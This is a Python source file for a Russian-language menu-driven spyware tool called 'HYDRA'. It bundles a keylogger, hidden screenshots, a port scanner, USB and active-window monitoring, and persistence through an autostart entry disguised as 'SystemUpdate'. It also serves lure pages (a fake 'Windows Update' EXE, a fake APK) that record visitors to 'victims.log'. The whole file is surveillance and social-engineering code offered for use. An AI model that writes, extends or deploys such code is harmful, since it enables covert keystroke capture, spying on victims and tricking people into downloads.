#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, socket, subprocess, threading, time, platform, requests, http.server, socketserver
from pynput import keyboard
from datetime import datetime
from PIL import ImageGrab
from colorama import Fore, Style, init

init(autoreset=True)

PORT = 8000
LOGFILE = "victims.log"


# ================== Цветной баннер ====================
def show_banner():
    print(Fore.RED + Style.BRIGHT + r"""
██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
██║  ██║██║   ██║██╔══██╗██╔══██╗██╔══██╗
███████║██║   ██║██║  ██║██████╔╝███████║
██╔══██║██║   ██║██║  ██║██╔═══╝ ██╔══██║
██║  ██║╚██████╔╝██████╔╝██║     ██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝
 ███ H Y D R A  -  M E N U   T O O L ███
""")


# ================== Главное меню ======================
def show_menu():
    print(Fore.CYAN + Style.BRIGHT + """
Выберите функцию:
1) Кейлоггер
2) Порт-сканнер
3) Скрытые скриншоты
4) Сбор Wi-Fi инфы
5) Пароли из браузера (с подменю)
6) Слежка за USB
7) Whois/GeoIP
8) Слежка за активными окнами
9) Автозагрузка
10) ASCII-арт 🎨
11) Все функции вместе
0) Выход
""")


# ===================== Логгер =========================
def log_event(msg):
    print(Fore.YELLOW + f"[LOG] {msg}")
    with open(LOGFILE, "a") as f:
        f.write(msg + "\n")


# ========== Вспомогательные модули функций ===========

def keylogger():
    def on_press(key):
        with open("hydra_keys.log", "a") as log:
            log.write(f"{key}\n")

    threading.Thread(target=keyboard.Listener(on_press=on_press).start(), daemon=True).start()
    print(Fore.GREEN + "[✓] Кейлоггер активирован.")


def scan_ports(target):
    print(Fore.YELLOW + f"[!] Скан портов: {target}")
    for port in range(1, 1025):
        try:
            with socket.socket() as s:
                s.settimeout(0.2)
                s.connect((target, port))
                print(Fore.GREEN + f"[+] Port {port} открыт")
        except:
            pass


def snap_screen():
    img = ImageGrab.grab()
    name = f"snap_{datetime.now().strftime('%H%M%S')}.png"
    img.save(name)
    print(Fore.CYAN + f"[✓] Скрин сохранён как {name}")


def get_active_window():
    try:
        out = subprocess.getoutput("xdotool getactivewindow getwindowname")
        print(Fore.MAGENTA + f"[★] Активное окно: {out}")
    except:
        print("[!] xdotool не найден")


def browser_dump_menu():
    print(Fore.CYAN + """
Выберите способ доставки:
1) Сайт (при заходе логируется)
2) EXE файл (фейковая загрузка)
3) APK файл (фейковая установка)
""")
    choice = input(Fore.GREEN + "hydra > ")

    os.makedirs("web", exist_ok=True)

    if choice == "1":
        # Создание фейкового сайта
        with open("web/index.html", "w") as f:
            f.write("""
<html><body><h2>Проверка браузера...</h2><script>fetch("/log?target=visited_site")</script></body></html>
""")
        log_event("📡 Фейк-сайт создан")

        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith("/log"):
                    payload = self.path.split("target=")[-1]
                    log_event(f"🎯 Активность: {payload}")
                    self.send_response(204)
                    self.end_headers()
                else:
                    super().do_GET()

        def run_server():
            os.chdir("web")
            with socketserver.TCPServer(("", PORT), Handler) as httpd:
                print(Fore.GREEN + f"[+] Сервер работает на http://localhost:{PORT}")
                httpd.serve_forever()

        run_server()

    elif choice == "2":
        # Создание фейкового EXE файла
        with open("web/index.html", "w") as f:
            f.write("""
<html><body><h2>Скачать Windows Update</h2><a href='/file.exe'>⬇ Скачать</a><script>fetch("/log?target=downloaded_exe")</script></body></html>
""")
        with open("web/file.exe", "wb") as exe:
            exe.write(b"FAKE EXE")  # Фейковый EXE файл
        log_event("💾 Фейковый EXE файл создан")

        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith("/log"):
                    payload = self.path.split("target=")[-1]
                    log_event(f"🎯 Активность: {payload}")
                    self.send_response(204)
                    self.end_headers()
                else:
                    super().do_GET()

        def run_server():
            os.chdir("web")
            with socketserver.TCPServer(("", PORT), Handler) as httpd:
                print(Fore.GREEN + f"[+] Сервер работает на http://localhost:{PORT}")
                httpd.serve_forever()

        run_server()

    elif choice == "3":
        # Создание фейкового APK файла
        with open("web/index.html", "w") as f:
            f.write("""
<html><body><h2>Установить APK</h2><a href='/app.apk'>⬇ Скачать</a><script>fetch("/log?target=downloaded_apk")</script></body></html>
""")
        with open("web/app.apk", "wb") as apk:
            apk.write(b"FAKE APK")  # Фейковый APK файл
        log_event("🤖 Фейковый APK файл создан")

        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith("/log"):
                    payload = self.path.split("target=")[-1]
                    log_event(f"🎯 Активность: {payload}")
                    self.send_response(204)
                    self.end_headers()
                else:
                    super().do_GET()

        def run_server():
            os.chdir("web")
            with socketserver.TCPServer(("", PORT), Handler) as httpd:
                print(Fore.GREEN + f"[+] Сервер работает на http://localhost:{PORT}")
                httpd.serve_forever()

        run_server()

    else:
        print(Fore.RED + "Неверный выбор")
        return


def geo_lookup(ip):
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json")
        print(Fore.BLUE + "[GeoIP]:", r.text)
    except:
        print("[!] Ошибка запроса")


def usb_monitor():
    def monitor():
        print(Fore.LIGHTBLUE_EX + "[✓] Слежка за USB активна.")
        old = subprocess.getoutput("lsblk")
        while True:
            time.sleep(3)
            new = subprocess.getoutput("lsblk")
            if new != old:
                print(Fore.LIGHTYELLOW_EX + "[USB] Обнаружено новое устройство!")
                old = new

    threading.Thread(target=monitor, daemon=True).start()


def setup_autostart():
    path = os.path.abspath(__file__)
    home = os.path.expanduser("~")
    auto = os.path.join(home, ".config/autostart")
    os.makedirs(auto, exist_ok=True)
    with open(os.path.join(auto, "hydra.desktop"), "w") as f:
        f.write(f"""[Desktop Entry]
Type=Application
Exec={path}
Hidden=false
X-GNOME-Autostart-enabled=true
Name=SystemUpdate
""")
    print(Fore.LIGHTGREEN_EX + "[✓] Автозапуск добавлен.")


def wifi_list():
    print(Fore.LIGHTCYAN_EX + "[✓] Сканируем Wi-Fi...")
    os.system("nmcli dev wifi list")


def ascii_art():
    print(Fore.MAGENTA + r"""
    .-''''-.
  .'        `.
 /      .-''-. \
|    .'      `.|
\__/`.___..__.'_/ 
Hydra пробудилась 🐍
""")


def run_all():
    keylogger()
    usb_monitor()
    ascii_art()
    system_info()
    wifi_list()
    get_active_window()
    snap_screen()
    setup_autostart()
    print(Fore.RED + "[🔥] Все функции активированы.")


def system_info():
    print(Fore.LIGHTWHITE_EX + f"[SysInfo] {platform.platform()} | {platform.node()}")


# ================== MAIN =====================

def main():
    show_banner()
    while True:
        show_menu()
        cmd = input(Fore.GREEN + "hydra > ")

        if cmd == "1":
            keylogger()
        elif cmd == "2":
            ip = input("Введите IP: ")
            scan_ports(ip)
        elif cmd == "3":
            snap_screen()
        elif cmd == "4":
            wifi_list()
        elif cmd == "5":
            browser_dump_menu()
        elif cmd == "6":
            usb_monitor()
        elif cmd == "7":
            ip = input("Введите IP/домен: ")
            geo_lookup(ip)
        elif cmd == "8":
            get_active_window()
        elif cmd == "9":
            setup_autostart()
        elif cmd == "10":
            ascii_art()
        elif cmd == "11":
            run_all()
        elif cmd == "0":
            print("Выход.")
            break
        else:
            print(Fore.RED + "Неверный ввод.")


if __name__ == "__main__":
    main()
